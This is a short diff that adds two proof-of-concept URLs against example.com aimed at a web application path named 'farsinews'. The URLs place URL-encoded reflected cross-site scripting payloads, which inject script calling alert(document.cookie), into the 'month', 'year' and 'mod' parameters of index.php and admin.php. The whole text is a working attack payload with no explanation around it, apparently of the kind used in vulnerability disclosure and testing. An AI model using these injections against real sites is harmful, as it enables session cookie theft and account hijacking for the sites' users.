@@ -1,0 +1,2 @@
+http://www.example.com/[farsinews_path]/index.php?month=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--&amp;year=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--
+http://www.example.com/[farsinews_path]/admin.php?mod=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C !--
